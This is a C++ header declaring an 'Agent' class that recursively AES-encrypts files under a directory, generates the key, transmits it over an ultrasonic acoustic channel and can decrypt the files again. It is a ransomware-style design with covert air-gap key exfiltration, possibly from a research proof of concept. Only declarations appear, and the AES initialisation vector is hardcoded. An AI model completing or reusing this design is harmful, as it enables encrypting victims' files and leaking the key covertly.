#pragma once

#include "Ultrasonic.h"
#undef main

#include <array>
#include <filesystem>
#include <Cryptopp/aes.h>


class Agent final
{
public:
	// ctor
	// param[in]	encryption_root_path	root path for the files encryption.
	Agent(std::filesystem::path encryption_root_path);

	// dtor
	~Agent();

	// Executes the agent logic.
	void execute();

	// Decrypt the files in the directory recursively.
	void decrypt(const std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH>& encryption_key) const;
	
	// Deleted functions
	Agent(const Agent&) = delete;
	Agent(Agent&&) = delete;
	Agent& operator=(const Agent&) = delete;
	Agent& operator=(Agent&&) = delete;
	
private:

	// Encrypt the files in the directory recursively.
	void encrypt_directory(const std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH>& encryption_key) const;

	// Generates aes key.
	// return								The aes key.
	static std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH> generate_key();

	// The ultrasonic function for the main thread.
	void ultrasonic_main();

	// Sends the key by using the ultrasonic.
	void send_key(const std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH>& encryption_key);
	
	// Members
	const std::filesystem::path m_encryption_root_path;
	std::mutex m_ultrasonic_mutex;
	ultrasonic::Ultrasonic m_ultrasonic;
	std::unique_ptr<std::jthread> m_ultrasonic_main_thread;
	std::unique_ptr<std::jthread> m_send_key_thread;
	bool m_agent_running = true;
	const std::array<CryptoPP::byte, CryptoPP::AES::BLOCKSIZE> m_init_vector{ 232, 123, 156, 89, 95, 3, 5, 76, 4, 45, 77, 23, 67, 78, 43, 229 };
};
